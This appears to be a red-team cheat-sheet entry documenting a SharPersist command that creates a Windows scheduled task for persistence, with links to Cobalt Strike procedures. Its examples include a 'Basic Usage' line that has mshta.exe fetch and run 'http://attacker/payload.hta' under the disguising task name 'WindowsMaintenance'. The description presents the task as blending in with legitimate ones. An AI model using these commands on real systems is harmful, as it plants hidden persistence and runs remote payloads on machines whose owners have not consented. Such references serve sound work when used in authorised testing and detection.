---
type: command
executor: powershell
data: >-
  SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n
  "Some Task" -m add
tags:
  - persistence
  - creation
platforms:
  - Windows
verified: true
validated: true
---

# sharpersist-add-scheduled-task-persistence

## Command

```powershell
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
```

## Description

Adds a standard scheduled task for daily execution at logon, visible in Task Scheduler for blending with legitimate tasks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-t schtask` | Type: Standard scheduled task | Yes |
| `-c <command>` | Executable to run | Yes |
| `-a <args>` | Arguments for the task | Yes |
| `-n <name>` | Task name | Yes |
| `-m add` | Mode to create the task | Yes |

## Examples

### Basic Usage

```powershell
SharPersist -t schtask -c "mshta.exe" -a "http://attacker/payload.hta" -n "WindowsMaintenance" -m add
```

### Advanced Usage

```powershell
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c ..." -n "Some Task" -m add
```

## Expected Output

```
Scheduled task added: Some Task
```

Check in Task Scheduler.

## Related

- [[procedures/Establish-Persistence-Using-SharPersist-in-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
